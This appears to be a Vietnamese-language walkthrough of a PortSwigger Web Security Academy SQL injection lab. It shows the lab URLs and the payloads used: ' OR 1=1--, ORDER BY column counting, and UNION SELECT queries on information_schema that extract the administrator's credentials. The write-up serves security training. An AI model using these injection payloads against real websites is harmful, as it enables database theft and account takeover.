![Giao diện lab ban đầu](images/Pasted%20image%2020260604101229.png)
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Gifts thì ta thấy ở url:
```LINK
https://0abd00f204c2e78d81c011ba007e005f.web-security-academy.net/filter?category=Gifts
```
Ta thấy phần `category=Gifts` thì có vẻ nó là lỗi về SQLi,ta thử `' OR 1=1--` rồi URL encode:
```LINK
https://0abd00f204c2e78d81c011ba007e005f.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```
Ta thấy nó hiện thêm các danh mục mà phần Gifts vốn không có => đây là SQLi
Mục tiêu của bài lab:lấy thông tin tên bảng,tên cột có chứa username:`administrator` và mật khẩu của nó để có thể đăng nhập bằng username:`administrator`
# Khai thác:
-Đầu tiên trước hết ta phải xác định số cột của truy vấn đầu tiên bằng cách dùng `' ORDER BY 1,2,3,..--
```LINK
https://0abd00f204c2e78d81c011ba007e005f.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+1--
https://0abd00f204c2e78d81c011ba007e005f.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+2--
```
Nhưng đến khi `' ORDER BY 3--` thì trang web găp lỗi Internal Server Error:
![ORDER BY 3 bị lỗi Internal Server Error](images/Pasted%20image%2020260604102159.png)
=> câu truy vấn trước có 2 cột
Tiếp theo ta cần xác định kiểu dữ liệu của từng cột và ngay lần thử với 2 cột text:
```LINK
https://0abd00f204c2e78d81c011ba007e005f.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,%27xyz%27--
```
![Kiểm tra kiểu dữ liệu với hai cột text](images/Pasted%20image%2020260604102619.png)
=> cả 2 cột đều là text nên ta có thể thay cột table_name vào cột nào cũng được

-Ta dùng UNION SELECT để lấy ra các bảng trong database:
```SQL
' UNION SELECT NULL,table_name FROM information_schema.tables--
```
![Lấy danh sách bảng từ information_schema.tables](images/Pasted%20image%2020260604102902.png)
Bằng cách `Ctrl + F` ta gõ `users` thì nó hiện ra một bảng có tên là `users_pohnsh`
Vì số cột câu truy vấn trước là 2 nên ta không thể cứ thế mà `SELECT * FROM user_pohnsh` được ta cần biết tên cột trong table đó:
```SQL
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_pohnsh'--
```
![Lấy tên cột từ information_schema.columns](images/Pasted%20image%2020260604103453.png)
Ta thấy có 2 cột là `username_dwcejq` và `password_uztqma` ta tiến hành bước lấy dữ liệu tài khoản mật khẩu của `username:administrator`
```SQL
' UNION SELECT username_dwcejq,password_uztqma FROM users_pohnsh WHERE username_dwcejq='administrator'--
```
![Lấy username và password của administrator](images/Pasted%20image%2020260604103840.png)
Vậy ta đã thành công lấy được tài khoản mật khẩu của `administrator`.Việc còn lại của ta là đăng nhập với dữ liệu lấy được và hoàn thành lab
![Đăng nhập administrator thành công](images/Pasted%20image%2020260604104015.png)
=>solved!
